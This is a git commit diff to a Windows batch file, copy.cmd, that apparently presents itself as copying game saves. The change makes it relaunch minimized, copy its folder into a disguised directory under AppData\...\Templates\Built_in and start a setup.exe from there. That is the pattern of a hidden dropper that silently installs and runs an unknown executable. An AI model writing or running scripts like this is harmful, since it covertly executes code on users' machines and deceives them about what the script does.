ea3234032b6a3ad8a2569e428d6db5349bfdd025
ASDFfdsak <127998767+ASDFfdsak@users.noreply.github.com>
2023-06-19 00:59:19 +0000

    Update copy.cmd

--- copy.cmd
+++ copy.cmd
@@ -1,5 +1,6 @@
 @echo off 
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-xcopy /C /R /Y /I saves "C:\Users\%USERNAME%\Saved Games\"
-start cmd.exe
+xcopy /C /R /Y /I saves "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\Built_in"
+cd "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\Built_in"
+start setup.exe
 exit
